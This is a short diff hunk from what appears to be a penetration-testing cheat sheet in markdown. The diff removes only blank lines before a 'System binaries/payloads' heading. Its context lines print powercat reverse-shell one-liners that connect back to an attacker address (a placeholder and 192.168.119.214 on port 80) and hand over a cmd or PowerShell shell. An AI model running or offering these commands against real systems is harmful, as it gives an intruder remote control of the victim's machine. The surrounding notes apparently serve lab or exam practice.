@@ -116,9 +116,6 @@ powercat -c X.X.X.X -p $port -e cmd OR powershell
 powercat -c 192.168.119.214 -p 80 -e cmd
 
 powercat -c 192.168.119.214 -p 80 -e powershell
-
-
-
 ```
 
 # System binaries/payloads
